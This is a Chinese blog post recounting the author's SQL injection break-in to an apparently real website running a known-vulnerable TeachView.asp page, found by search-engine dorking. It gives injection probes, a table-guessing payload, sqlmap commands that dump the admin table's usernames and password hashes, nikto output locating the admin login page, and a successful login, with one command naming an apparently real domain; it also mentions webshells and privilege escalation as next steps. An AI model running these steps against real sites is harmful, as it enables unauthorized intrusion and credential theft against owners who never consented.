---
layout: post
title:  " 一次Sql注入记录"
categories: Hacker
tags:  sql hacker
---

* content
{:toc}

## 0x00 背景

菜鸟级别的sql注入。

## 0x01 踩点

现在sql注入的漏洞已经不太好找了，大部分的网站都对这方面做好了防范，因此如果你继续使用`inurl:asp?id=`这种语法来查找试点，其实也挺困难的，很大的可能是找了很久都找不到，打消积极性。

所幸有很多现有的漏洞，比如搜关键字`inurl:TeachView.asp`，这是一个已知的漏洞，很早前在乌云上就有了，但是还有很多带着漏洞的网站在运行，因此，在百度上一搜，大把大把的......





### sql注入漏洞检测三部曲

**第一步：**

```
http://www.example.com/TeachView.asp?id=1'
#网页应该会变化，一般出现个错误界面，里面有错误代码,比如下面的信息：
Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e14'[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=1鈥' 中。/TeachView.asp，行 5
```

**第二步：**

```
http://www.example.com/TeachView.asp?id=1 and 1=1
#网页应该是正常的。
```

**第三步：**

```
http://www.example.com/TeachView.asp?id=1 and 1=2

#网页有出错了，但是和之前的不一样了。
ADODB.Field 错误 '80020009'BOF 或 EOF 中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。/TeachView.asp，行 0

```

## 0x02 sql注入

sql注入分手工和工具注入。目前网上大部分都是教各种工具的用法，其实最好还是先自己尝试手动试一下，至少能了解大致的思路，比如怎么猜数据库名、字段，然后再使用工具。

### 手动注入举例

其实我也不怎么会手动注入，只是自己尝试几个后就用工具了，比较懒，以后看心情学了。很多猜测技巧，网上有现成的！

```
#举个小栗子，猜测表名
http://www.example.com/TeachView.asp?id=1 and (select count(*) from admin )>0
```

### sqlmap

当发现自己动手实在猜不出来结果后，直接上工具，kali自带sqlmap就够用，看一下帮助文档，开搞。

*下面记录，忽略大部分没用的信息，并且隐藏了所有我意识到的真实的数据。*

**先试下能不能看到所有数据库：**

```
~$ sqlmap -u "http://www.example.com/TeachView.asp?id=1" --dbs

......

web server operating system: Windows 2003 or XPweb application technology: ASP.NET, 
Microsoft IIS 6.0, 
ASPback-end DBMS: Microsoft Access[02:15:55] [WARNING] on Microsoft Access 
it is not possible to enumerate databases (use only '--tables')
......

```

嗯，貌似不用枚举所有的db名称，但是知道了服务器的情况，剩了nmap自己扫了。貌似版本都很低，看来我也就配这种老系统了......

**那直接看一下表名：**

```
~$ sqlmap -u "http://www.yxqyxzx.com/TeachView.asp?id=1" --tables
......
[02:19:01] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[02:19:01] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'
......
[02:19:55] [INFO] retrieved: admin
......

```

我很好奇，之前都搜不出来db名，这次直接就默认了一个db的名字，个人猜测，sqlmap是通过这个web程序的权限来看数据库，那么通过这个web入口应该默认到这个数据库中。

数据表比较多，暂时只关注最主要的admin表。

**然后要尝试获取字段：**

```
~$ sqlmap -u "http://www.example.com/TeachView.asp?id=1" --dump -T admin

......
[02:53:46] [INFO] retrieved: id[02:53:52] [INFO] retrieved: adminname[02:55:08] [INFO] retrieved: adminpassword
......
```

**接着就是获取帐号密码：**

其实帐号可以自己猜一些，手动注入的时候可以试试，比如admin、administrator什么的，怎么手动获取密码我还不会。

```
sqlmap -u "http://www.example.com/TeachView.asp?id=1" --dump -T admin -C adminnamDatabase:
Microsoft_Access_masterdbTable: admin[2 entries]+----+-----+-----+------------------+----------+-----------+------------------+| id | url | num | title            | username | adminname | adminpassword    |+----+-----+-----+------------------+----------+-----------+------------------+| 1  | NULL | 198 | OY\x7f\x8es\x89- || admin    | 7a57a5a743894a0e || 4  | NULL | 472 | OY\x7f\x8es\x89- || admin2    | 7a57a5a743894a0e |

```

好了，现在获取到了帐号和密码的MD5值，然后上网解密一下就行了。

## 0x03 后台地址查找

查找后台地址的时候，我很靠谱的使用了手动查找，各种inurl就是搜不出来后台，最后看了一下kali里面有一个nikto，看一下帮助文档，感觉很傻瓜的样子。

```
~$ nikto -host http://www.example.com

- Nikto v2.1.6

---------------------------------------------------------------------------

+ Target IP:          *.*.*.*

+ Target Hostname:    www.example.com

+ Target Port:        *

+ Start Time:        2016-03-06 02:39:37 (GMT8)

---------------------------------------------------------------------------

......

+ Multiple index files found: /index.html, /index.asp

......

+ /admin/login.asp: Admin login page/section found.

+ /login.asp: Admin login page/section found.

......

```

**然后根据前面的帐号密码就可以很开心的进去了。**

## 0xFF 总结

个人感觉，上面记录的方法应该是非常不前卫的，因为大部分网站都很那找到这种漏洞了，但是思想应该还是比较相近的，可以学习一下整个思路，然后与时俱进地学习。

拿到管理员帐号后，可以做更多事，比如上传webshell、提权什么乱七八糟的，这就留到以后了。

第一次入侵成功后，其实没有什么成就感，也没有什么破坏欲，最大的感受就是，好坏就在一念之差了。



******
2016-03-06 22:00:00 hnds
******
